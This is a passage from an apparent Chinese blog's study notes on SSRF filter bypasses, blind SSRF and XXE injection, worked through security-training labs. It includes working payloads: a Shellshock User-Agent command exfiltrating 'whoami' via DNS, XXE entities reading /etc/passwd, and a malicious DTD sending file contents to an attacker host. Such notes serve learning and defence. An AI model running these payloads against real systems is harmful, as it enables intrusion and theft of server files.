<h3 id="具有基于白名单的输入过滤器的-SSRF"><a href="#具有基于白名单的输入过滤器的-SSRF" class="headerlink" title="具有基于白名单的输入过滤器的 SSRF"></a>具有基于白名单的输入过滤器的 SSRF</h3><p>某些应用程序仅允许匹配允许值白名单的输入。过滤器可能会在输入的开头或输入中包含的内容中查找匹配项</p>
<ul>
<li>可以使用<code>@</code>字符将凭据嵌入到主机名前的 URL 中。（在 URL 里，@ 主要用于指定用户名和密码）例如：</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="DTS"><figure class="iseeu highlight /dts"><table><tr><td class="code"><pre><span class="line"><span class="symbol">https:</span><span class="comment">//expected-host:fakepassword@evil-host</span></span><br></pre></td></tr></table></figure></div>
<p>服务器可能解析 @ 之前的  作为主机</p>
<ul>
<li>可以使用<code>#</code>字符来表示 URL 片段。（<code>#</code>后的片段仅用于浏览器端解析，不会被发送到服务器。）例如：</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AVRASM"><figure class="iseeu highlight /avrasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">https:</span>//evil-host<span class="meta">#expected-host</span></span><br></pre></td></tr></table></figure></div>
<ul>
<li>可以利用 DNS 命名层次结构将所需的输入放入 控制的完全限定 DNS 名称中。例如</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="DTS"><figure class="iseeu highlight /dts"><table><tr><td class="code"><pre><span class="line"><span class="symbol">https:</span><span class="comment">//expected-host.evil-host</span></span><br></pre></td></tr></table></figure></div>
<ul>
<li>可以对字符进行 URL 编码，以混淆 URL 解析代码。如果实现过滤器的代码处理 URL 编码字符的方式与执行后端 HTTP 请求的代码不同，则这种方法特别有用。 还可以尝试对字符进行双重编码；某些服务器会以递归方式对收到的输入进行 URL 解码，这可能会导致进一步的差异。</li>
<li>可以将这些技术组合使用<br>举例<br>如果直接访问127.1会出现<code>External stock check host must be stock.weliketoshop.net</code><br>说明是一个白名单过滤，域名中必须出现stock.weliketoshop.net<br>尝试使用<code>http://username@stock.weliketoshop.net</code>发现是可以用这种嵌入式凭据的<br>现在再尝试在username后面加上#,拒绝访问，就用两次url编码#<br><img src="https://pic1.imgdb.cn/item/67c31843d0e0a243d409394a.png"></li>
</ul>
<h3 id="通过开放重定向绕过-SSRF-过滤器"><a href="#通过开放重定向绕过-SSRF-过滤器" class="headerlink" title="通过开放重定向绕过 SSRF 过滤器"></a>通过开放重定向绕过 SSRF 过滤器</h3><p>假设用户提交的 URL 经过严格验证，以防止恶意利用 SSRF 行为。但是，允许其 URL 的应用程序包含一个开放的重定向漏洞。假设用于发出后端 HTTP 请求的 API 支持重定向， 可以构造一个满足过滤器的 URL，并导致将请求重定向到所需的后端目标。<br>例如，应用程序包含一个开放重定向漏洞，其中以下 URL：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="DTS"><figure class="iseeu highlight /dts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">/product/</span>nextProduct?currentProductId=<span class="number">6</span><span class="variable">&amp;path</span>=http:<span class="comment">//evil-user.net</span></span><br></pre></td></tr></table></figure></div>
<p>返回重定向到：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="DTS"><figure class="iseeu highlight /dts"><table><tr><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//evil-user.net</span></span><br></pre></td></tr></table></figure></div>
<p>此 SSRF 漏洞之所以有效，是因为应用程序首先验证提供的 stockAPI URL 是否位于允许的域中，事实确实如此。然后，应用程序请求提供的 URL，从而触发开放重定向。它遵循重定向，并向攻击者选择的内部 URL 发出请求。<br>示例：<br>比如在这个商品界面，在查询库存的界面发现无法直接访问localhost，在这里找到一个有重定向的界面，这里的下一个商品<br><img src="https://pic1.imgdb.cn/item/67c31a8ad0e0a243d4093b5d.png"><br>通过抓包可以发现这里访问的路径是<code>/product/nextProduct?currentProductId=1&amp;path=/product?productId=2</code><br>现在再回到查看商品储存的界面，然后把stockApi改成刚才的重定向路径，把path改成我们想要的<br><img src="https://pic1.imgdb.cn/item/67c31d35d0e0a243d4093fde.png"></p>
<h2 id="盲SSRF"><a href="#盲SSRF" class="headerlink" title="盲SSRF"></a>盲SSRF</h2><p>当应用程序被诱导向提供的 URL 发出后端 HTTP 请求，但是后端请求的响应未在应用程序的前端响应中返回时，就会出现盲 SSRF 漏洞。由于盲目 SSRF 漏洞具有单向性，其影响通常低于完全知情的 SSRF 漏洞。它们不能被轻易利用来从后端系统检索敏感数据，尽管在某些情况下它们可以被利用来实现完全远程代码执行。</p>
<p>检测盲 SSRF 漏洞最可靠的方法是使用带外 (OAST) 技术。这涉及尝试触发对 控制的外部系统的 HTTP 请求，并监控与该系统的网络交互。实际上就是访问我们的服务器，然后从log中可以看到访问痕迹<br>可以使用burpsuite的Burp Collaborator<br><img src="https://pic1.imgdb.cn/item/67c32195d0e0a243d40941c0.png"><br>比如这里就是修改Referer成Collaborator中的url，然后就可以在访问记录中看到<br>服务器向攻击者控制的 URL 发送请求，但攻击者看不到 HTTP 响应。攻击者无法直接探测出请求是否成功，或者返回了什么数据。但盲 SSRF 仍然可以用于攻击！<br>攻击者可以利用它来探测服务器或内部网络中的其他漏洞，例如：<br>端口扫描：探测服务器是否可以访问某些内部 IP 及其端口。<br>漏洞扫描：发送针对已知漏洞的恶意 Payload，看看是否有回响（如 Log4j）。<br>RCE（远程代码执行）：如果目标服务器上有易受攻击的服务，攻击者可以利用 SSRF 进行攻击。<br>示例<br><img src="https://pic1.imgdb.cn/item/67c32b22d0e0a243d4094549.png"><br>这里前面通过bp的扫描发现user-agent和referer有漏洞，然后在useragent这里植入shellshock漏洞代码<br>shellshock漏洞:，Bash <strong>在解析环境变量时存在漏洞</strong>，如果环境变量的值以 <code>()</code> 开头并带有 <strong>额外的命令</strong>，Bash 会<strong>在解析时执行这些命令</strong>，即使它们不在函数体内。<br>    <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ARCADE"><figure class="iseeu highlight /arcade"><table><tr><td class="code"><pre><span class="line">()&#123; :; &#125;; <span class="regexp">/usr/</span>bin/nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN</span><br></pre></td></tr></table></figure></div><br>把这里的BURP-COLLABORATOR-SUBDOMAIN替换成collaborater的url，然后referer替换成想要执行盲ssrf的地址，最后把地址中的<code>http://192.168.0.1:8080</code> ，然后突出显示 IP 地址的最后一个八位字节（数字 1 ），单击添加 §。开始攻击，没有确定在哪个ip<br>最后操作系统用户的名称应出现在 DNS 子域中。<br><img src="https://pic1.imgdb.cn/item/67c32c27d0e0a243d40945e3.png"></p>
<h2 id="寻找-SSRF-漏洞的隐藏攻击面"><a href="#寻找-SSRF-漏洞的隐藏攻击面" class="headerlink" title="寻找 SSRF 漏洞的隐藏攻击面"></a>寻找 SSRF 漏洞的隐藏攻击面</h2><p>许多服务器端请求伪造漏洞很容易找到，因为应用程序的正常流量涉及包含完整 URL 的请求参数。其他 SSRF 示例更难找到。</p>
<h3 id="请求中的部分-URL"><a href="#请求中的部分-URL" class="headerlink" title="请求中的部分 URL"></a>请求中的部分 URL</h3><p>有时，应用程序只会将主机名或 URL 路径的一部分放入请求参数中。提交的值随后会在服务器端合并到请求的完整 URL 中。如果该值很容易被识别为主机名或 URL 路径，则潜在的攻击面可能很明显。但是，由于 无法控制请求的整个 URL，因此完整 SSRF 的可利用性可能会受到限制。</p>
<h3 id="数据格式中的-URL"><a href="#数据格式中的-URL" class="headerlink" title="数据格式中的 URL"></a>数据格式中的 URL</h3><p>某些应用程序以某种格式传输数据，这种格式的规范允许包含数据解析器可能请求的 URL。一个明显的例子是 XML 数据格式，它已广泛用于 Web 应用程序中，用于将结构化数据从客户端传输到服务器。当应用程序接受 XML 格式的数据并对其进行解析时，它可能容易受到 XXE 注入的攻击。它也可能容易通过 XXE 受到 SSRF 的攻击。</p>
<h3 id="通过-Referer-头发起-SSRF"><a href="#通过-Referer-头发起-SSRF" class="headerlink" title="通过 Referer 头发起 SSRF"></a>通过 Referer 头发起 SSRF</h3><p>一些应用程序使用服务器端分析软件来跟踪访问者。该软件通常会在请求中记录 Referer 标头，以便跟踪传入链接。分析软件通常会访问 Referer 标头中出现的任何第三方 URL。这通常是为了分析引荐网站的内容，包括传入链接中使用的锚文本。因此，Referer 标头通常是 SSRF 漏洞的有用攻击面。<br>刚才的盲ssrf中就很多利用到了Referer  还有user-agent</p>
]]></content>
      <categories>
        <category>漏洞</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>笔记</tag>
        <tag>漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>XXE漏洞学习笔记</title>
    <url>/posts/11248.html</url>
    <content><![CDATA[<p>XML external entity (XXE) injection学习笔记</p>
<span id="more"></span>
<p>最近刷题的时候碰到了xxe漏洞，我之前没了解过，现在就用bp的实验室来学习这个漏洞吧，写个笔记记录一下。</p>
<h2 id="什么是XML-XML实体-DTD"><a href="#什么是XML-XML实体-DTD" class="headerlink" title="什么是XML XML实体 DTD?"></a>什么是XML XML实体 DTD?</h2><p>XML 代表 “可扩展标记语言”。XML 是一种用于存储和传输数据的语言。和html一样使用标签，但是xml可以用自定义的标签。</p>
<p>XML 实体是一种在 XML 文档中表示数据项的方式，而不是使用数据本身。XML 语言规范中内置了各种实体。例如，实体 &lt; 和 &gt; 表示字符 &lt; 和 &gt; 。这些是用于表示 XML 标签的元字符，因此当它们出现在数据中时，通常必须使用其实体来表示。</p>
<p>XML 文档类型定义 (DTD) 包含声明，这些声明可以定义 XML 文档的结构、文档中可以包含的数据值类型以及其他项目。DTD 在 XML 文档开头的可选 DOCTYPE 元素中声明。DTD 可以完全包含在文档本身中（称为 “内部 DTD”），也可以从其他地方加载（称为 “外部 DTD”），也可以是两者的混合。<br>DTD可以类比html中的css，为了让xml的格式统一，便于传输</p>
<p><strong>XML自定义实体</strong>：<br>XML 允许在 DTD 中定义自定义实体。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [ <span class="meta">&lt;!ENTITY <span class="keyword">myentity</span> <span class="string">&quot;my entity value&quot;</span> &gt;</span> ]&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>此定义意味着 XML 文档中任何对实体引用 &myentity; 的使用都将被替换为定义的值：“ my entity value ”。</p>
<p><strong>XML自定义实体</strong>：<br>XML 外部实体是一种自定义实体，其定义位于声明它们的 DTD 之外。<br>外部实体的声明使用 SYSTEM 关键字，并且必须指定应从中加载实体值的 URL。URL也可以用php伪协议，file协议等等,如</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [ <span class="meta">&lt;!ENTITY <span class="keyword">ext</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///path/to/file&quot;</span> &gt;</span> ]&gt;</span></span><br></pre></td></tr></table></figure></div>

<h2 id="什么是xxe漏洞-如何出现"><a href="#什么是xxe漏洞-如何出现" class="headerlink" title="什么是xxe漏洞 如何出现"></a>什么是xxe漏洞 如何出现</h2><p>允许攻击者干扰应用程序对 XML 数据的处理。它通常允许攻击者在应用程序服务器文件系统上查看文件，并与应用程序本身可以访问的任何后端或外部系统进行交互。</p>
<p>一些应用程序使用 XML 格式在浏览器和服务器之间传输数据。这样做的应用程序实际上始终使用标准库或平台 API 来处理服务器上的 XML 数据。 XXE 漏洞之所以出现，是因为 XML 规范包含各种潜在危险的功能，并且标准解析器也支持这些功能，即使应用程序通常不使用它们。<br>上面也有说到xml的外部实体可以运行其他的协议，所以可以读取本地文件，在一些情况还会出现ssrf(服务器端请求伪造)</p>
<h2 id="xxe攻击类型"><a href="#xxe攻击类型" class="headerlink" title="xxe攻击类型"></a>xxe攻击类型</h2><h3 id="利用-xxe-检索文件"><a href="#利用-xxe-检索文件" class="headerlink" title="利用 xxe 检索文件"></a>利用 xxe 检索文件</h3><p>这种攻击需要两步提交xml<br>1 创建一个DOCTYPE 然后定义一个实体<br>2 发送数据请求，引用到这个实体<br>比如购物申请通过将以下 XML 提交到服务器：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">stockCheck</span>&gt;</span><span class="tag">&lt;<span class="name">productId</span>&gt;</span>381<span class="tag">&lt;/<span class="name">productId</span>&gt;</span><span class="tag">&lt;/<span class="name">stockCheck</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>因为服务器没有xxe的防御措施，我们可以这样利用</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [ <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file///etc/passwd&quot;</span>&gt;</span> ]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">stockCheck</span>&gt;</span><span class="tag">&lt;<span class="name">productId</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">productId</span>&gt;</span><span class="tag">&lt;/<span class="name">stockCheck</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>这样子发送数据后，系统就回读取到&#x2F;etc&#x2F;passwd中的文件，然后返回给我们<br><img src="https://pic1.imgdb.cn/item/67c087d9d0e0a243d407528c.png"></p>
<h3 id="利用-xxe-执行SSRF"><a href="#利用-xxe-执行SSRF" class="headerlink" title="利用 xxe 执行SSRF"></a>利用 xxe 执行SSRF</h3><p>这会让程序的服务器访问任意的URL提出HTTP请求</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [ <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://internal.vulnerable-website.com/&quot;</span>&gt;</span> ]&gt;</span></span><br></pre></td></tr></table></figure></div>
<p><img src="https://pic1.imgdb.cn/item/67c08c33d0e0a243d40754a0.png"><br>比如这里ssrf攻击，访问内部资源，然后根据返回得到一个id，然后可以根据这些敏感信息继续得到一些信息</p>
<h3 id="盲xxe"><a href="#盲xxe" class="headerlink" title="盲xxe"></a>盲xxe</h3><p>很多xxe漏洞是不会在响应中返回定义的外部实体，但是可以触发xml解析错误或者和外部的网络交互，从而导致敏感数据泄漏</p>
<p>1 让外部实体访问攻击者设置的url，这样在攻击机上可以监听http请求，从而确定攻击是否成功，如</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [ <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://f2g9j7hhkax.web-attacker.com&quot;</span>&gt;</span> ]&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>有时程序会加强解析器，一般的xml实体攻击会被阻止，这时候就要用XML 参数实体。 XML 参数实体是一种特殊的 XML 实体，只能在 DTD 中的其他地方引用。<br>首先，XML 参数实体的声明在实体名称前包含百分号：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">myparameterentity</span> <span class="string">&quot;my parameter entity value&quot;</span> &gt;</span></span><br></pre></td></tr></table></figure></div>

<p>其次，使用百分号而不是通常的 “与” 符号来引用参数实体：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HAML"><figure class="iseeu highlight /haml"><table><tr><td class="code"><pre><span class="line"><span class="tag">%<span class="selector-tag">myparameterentity</span></span>;</span><br></pre></td></tr></table></figure></div>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [ <span class="meta">&lt;!ENTITY % <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://f2g9j7hhkax.web-attacker.com&quot;</span>&gt;</span> %xxe; ]&gt;</span></span><br></pre></td></tr></table></figure></div>
<p><img src="https://pic1.imgdb.cn/item/67c11592d0e0a243d4078a52.png"><br>要注意xml参数实体和普通实体的区别，多了个% 而且在最后要在DOCTYPE里面引用。</p>
<h4 id="利用盲xxe访问敏感数据"><a href="#利用盲xxe访问敏感数据" class="headerlink" title="利用盲xxe访问敏感数据"></a>利用盲xxe访问敏感数据</h4><p>上面知识说了什么是盲xxe，具体应该如何使用它呢。<br>它需要攻击者在他们控制的系统上托管恶意 DTD，然后从带内 XXE 负载中调用外部 DTD。</p>
<p>用于窃取 &#x2F;etc&#x2F;passwd 文件内容的恶意 DTD 示例如下：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MOJOLICIOUS"><figure class="iseeu highlight /mojolicious"><table><tr><td class="code"><pre><span class="line"><span class="language-xml"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="meta">&lt;!ENTITY % <span class="keyword">eval</span> <span class="string">&quot;&lt;!ENTITY &amp;#x25; exfiltrate SYSTEM &#x27;http://web-attacker.com/?x=%file;&#x27;&gt;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span><span class="language-perl"><span class="variable">%eval</span>;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="language-perl"><span class="variable">%exfiltrate</span>;</span></span><br></pre></td></tr></table></figure></div>
<p>定义一个名为 file 的 XML 参数实体，其中包含 &#x2F;etc&#x2F;passwd 文件的内容。<br>然后又定义了一个内部实体eval 包含了另一个exfiltrate实体的内容，<code>&amp;#x25;</code>是百分号，由于 % 在实体定义中有特殊含义，所以需要使用这种转义方式来表示普通的百分号。<br>最后用<code>%eval</code>来调用这个实体，当解析器遇到这行代码的时候，会插入这个实体定义的内容<br>notes</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CRMSH"><figure class="iseeu highlight /crmsh"><table><tr><td class="code"><pre><span class="line">此技术可能不适用于某些文件内容，包括 /etc/passwd 文件中的换行符。这是因为某些 <span class="keyword">XML</span> <span class="title">解析器使用 API</span> 获取外部实体定义中的 URL，该 API 会验证 URL 中允许出现的字符。在这种情况下，可以使用 FTP 协议而不是 HTTP。有时，无法窃取包含换行符的数据，因此可以改为针对 /etc/hostname 等文件。</span><br></pre></td></tr></table></figure></div>
<p>示例<br><img src="https://pic1.imgdb.cn/item/67c11fc8d0e0a243d4079e0c.png"><br>在服务器上先写入恶意dtd文件<br>然后用内部实体给服务器的恶意dtd地址发送请求，<br><img src="https://pic1.imgdb.cn/item/67c11fd8d0e0a243d4079e4e.png"><br>就可以在服务器上的accesslog上面看到hostname了<br><img src="https://pic1.imgdb.cn/item/67c11ff7d0e0a243d4079eb0.png"></p>
<p>说完了用外部服务器利用盲xxe，现在再来看看用报错利用xxe</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MOJOLICIOUS"><figure class="iseeu highlight /mojolicious"><table><tr><td class="code"><pre><span class="line"><span class="language-xml"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="meta">&lt;!ENTITY % <span class="keyword">eval</span> <span class="string">&quot;&lt;!ENTITY &amp;#x25; error SYSTEM &#x27;file:///nonexistent/%file;&#x27;&gt;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span><span class="language-perl"><span class="variable">%eval</span>;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="language-perl"><span class="variable">%error</span>;</span></span><br></pre></td></tr></table></figure></div>
<p>总体的结构和刚才很像，这里是通过访问一个不存在的文件，让xml报错，这个名称就是<code>%file</code>的内容了<br>也是现在服务器上先放上这个恶意dtd文件<br><img src="https://pic1.imgdb.cn/item/67c12110d0e0a243d407a193.png"><br>当我们去访问我们服务器上的这个dtd文件的时候，因为没有这个文件地址，所以有报错，根据报错信息，就能得到&#x2F;etc&#x2F;passwd了<br><img src="https://pic1.imgdb.cn/item/67c12181d0e0a243d407a2ae.png"></p>
<h4 id="通过重新利用本地-DTD-来利用盲-XXE"><a href="#通过重新利用本地-DTD-来利用盲-XXE" class="headerlink" title="通过重新利用本地 DTD 来利用盲 XXE"></a>通过重新利用本地 DTD 来利用盲 XXE</h4><p>上述技术适用于外部 DTD，但通常不适用于 DOCTYPE 元素中完全指定的内部 DTD。这是因为该技术涉及在另一个参数实体的定义中使用 XML 参数实体。根据 XML 规范，这在外部 DTD 中是允许的，但在内部 DTD 中是不允许的。（有些解析器可能会容忍这种情况，但许多解析器则不会。）</p>
<p>那么，当带外交互被阻止时，盲 XXE 漏洞会怎样呢？无法通过带外连接泄露数据，也无法从远程服务器加载外部 DTD。</p>
<p>如果文档的 DTD 使用内部和外部 DTD 声明的混合，则内部 DTD 可以重新定义在外部 DTD 中声明的实体。发生这种情况时，在另一个参数实体的定义中使用 XML 参数实体的限制会放宽。</p>
<p>本质上，攻击涉及调用恰好存在于本地文件系统上的 DTD 文件并重新利用它以触发包含敏感数据的解析错误的方式重新定义现有实体</p>
<p>例如，假设服务器文件系统上 &#x2F;usr&#x2F;local&#x2F;app&#x2F;schema.dtd 位置有一个 DTD 文件，并且此 DTD 文件定义了一个名为 custom_entity 的实体。攻击者可以通过提交如下混合 DTD 来触发包含 &#x2F;etc&#x2F;passwd 文件内容的 XML 解析错误消息：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MOJOLICIOUS"><figure class="iseeu highlight /mojolicious"><table><tr><td class="code"><pre><span class="line"><span class="language-xml"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [</span></span></span><br><span class="line"><span class="meta"><span class="language-xml"><span class="meta">&lt;!ENTITY % <span class="keyword">local_dtd</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///usr/local/app/schema.dtd&quot;</span>&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="language-xml"><span class="meta">&lt;!ENTITY % <span class="keyword">custom_entity</span> <span class="string">&#x27;</span></span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta"><span class="language-xml">&lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span></span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta"><span class="language-xml">&lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span></span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta"><span class="language-xml">&amp;#x25;eval;</span></span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta"><span class="language-xml">&amp;#x25;error;</span></span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta"><span class="language-xml">&#x27;</span>&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="language-xml"></span></span><span class="language-perl"><span class="variable">%local_dtd</span>;</span><span class="language-xml"><span class="meta"></span></span></span><br><span class="line"><span class="meta"><span class="language-xml">]&gt;</span></span></span><br></pre></td></tr></table></figure></div>
<p>定义一个名为 local_dtd 的 XML 参数实体，其中包含服务器文件系统上存在的外部 DTD 文件的内容。<br>重新定义名为 custom_entity 的 XML 参数实体，该实体已在外部 DTD 文件中定义。该实体被重新定义为包含已描述的基于错误的 XXE 漏洞，用于触发包含 &#x2F;etc&#x2F;passwd 文件内容的错误消息。<br>使用 local_dtd 实体，以便解释外部 DTD，包括 custom_entity 实体的重新定义值。这会产生所需的错误消息。<br>转义后的真实含义：</p>
<table>
<thead>
<tr>
<th>转义写法</th>
<th>对应字符</th>
<th>解释</th>
</tr>
</thead>
<tbody><tr>
<td><code>&amp;#x25;</code></td>
<td>%</td>
<td>用于定义参数实体（如 %file）</td>
</tr>
<tr>
<td><code>&amp;#x26;</code></td>
<td>&amp;</td>
<td>转义后的 &amp;，用于后续嵌套实体定义</td>
</tr>
<tr>
<td><code>&amp;#x27;</code></td>
<td>‘</td>
<td>单引号，用于包裹字符串避免与外围引号冲突</td>
</tr>
</tbody></table>
<p><code>&amp;#x26;#x25;</code>是双重转义，因为这一行代码里<code>&amp;#x25;</code>已经被使用，所以先转移出一个<code>&amp;</code>再和后面拼接，转义出一个<code>%</code><br>由于此 XXE 攻击涉及重新利用服务器文件系统上的现有 DTD，因此关键要求是找到合适的文件。这实际上非常简单。由于应用程序会返回 XML 解析器抛出的任何错误消息，因此只需尝试从内部 DTD 中加载它们即可轻松枚举本地 DTD 文件。<br>例如，使用 GNOME 桌面环境的 Linux 系统通常有一个 DTD 文件 &#x2F;usr&#x2F;share&#x2F;yelp&#x2F;dtd&#x2F;docbookx.dtd 可以通过提交以下 XXE payload 来测试此文件是否存在，如果文件缺失，将导致错误：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MOJOLICIOUS"><figure class="iseeu highlight /mojolicious"><table><tr><td class="code"><pre><span class="line"><span class="language-xml"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [</span></span></span><br><span class="line"><span class="meta"><span class="language-xml"><span class="meta">&lt;!ENTITY % <span class="keyword">local_dtd</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;</span>&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="language-xml"></span></span><span class="language-perl"><span class="variable">%local_dtd</span>;</span><span class="language-xml"><span class="meta"></span></span></span><br><span class="line"><span class="meta"><span class="language-xml">]&gt;</span></span></span><br></pre></td></tr></table></figure></div>

<p>测试了常见 DTD 文件列表以找到存在的文件后，需要获取该文件的副本并查看它以找到可以重新定义的实体。由于许多包含 DTD 文件的常见系统都是开源的，因此通常可以通过互联网搜索快速获取文件副本。</p>
<p>比如使用GNOME 桌面环境的系统通常有一个 DTD &#x2F;usr&#x2F;share&#x2F;yelp&#x2F;dtd&#x2F;docbookx.dtd 包含一个名为 ISOamso.<br><img src="https://pic1.imgdb.cn/item/67c12c9ad0e0a243d407b5af.png"></p>
<h3 id="寻找-XXE-注入的隐藏攻击面"><a href="#寻找-XXE-注入的隐藏攻击面" class="headerlink" title="寻找 XXE 注入的隐藏攻击面"></a>寻找 XXE 注入的隐藏攻击面</h3><p>在许多情况下，XXE 注入漏洞的攻击面很明显，因为应用程序的正常 HTTP 流量包括包含 XML 格式数据的请求。在其他情况下，攻击面不太明显。但是，如果你在正确的地方寻找，你会在不包含任何 XML 的请求中找到 XXE 攻击面。</p>
<h4 id="XInclude-attacks-XInclude-攻击"><a href="#XInclude-attacks-XInclude-攻击" class="headerlink" title="XInclude attacks  XInclude 攻击"></a>XInclude attacks  XInclude 攻击</h4><p>一些应用程序接收客户端提交的数据，在服务器端将其嵌入 XML 文档，然后解析该文档。例如，客户端提交的数据被放入后端 SOAP 请求中，然后由后端 SOAP 服务进行处理。<br>在这种情况下， 无法进行经典的 XXE 攻击，因为 无法控制整个 XML 文档， XInclude 无法定义或修改 DOCTYPE 元素。但是， 可能能够改用 XInclude 是 XML 规范的一部分，允许从子文档构建 XML 文档。 可以在 XML 文档中的任何数据值中放置 XInclude 攻击，因此可以在 仅控制放置在服务器端 XML 文档中的单个数据项的情况下执行攻击。<br>要执行 XInclude 攻击， 需要引用 XInclude 命名空间并提供要包含的文件的路径。例如：</p>
